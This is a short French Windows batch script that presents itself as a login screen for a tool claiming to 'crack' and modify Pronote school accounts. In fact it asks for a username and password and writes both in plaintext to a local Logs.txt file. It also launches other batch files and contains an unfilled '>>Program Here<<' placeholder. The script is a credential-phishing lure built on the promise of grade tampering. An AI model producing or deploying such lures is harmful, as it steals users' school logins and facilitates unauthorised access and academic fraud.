@echo off
color b
title Login Page pour Crack Pronote
cls
echo Bienvenue dans Crackprnt, un logiciel qui permet de modifier votre contenu pronote
echo.
echo.
echo Entrer votre identifiant et mot de passe :
set /p user=Username:
set /p pass=Password:
start wait.bat
start main.bat
echo Username=”%user%” Password=”%pass%” >> Logs.txt
start >>Program Here<<
exit

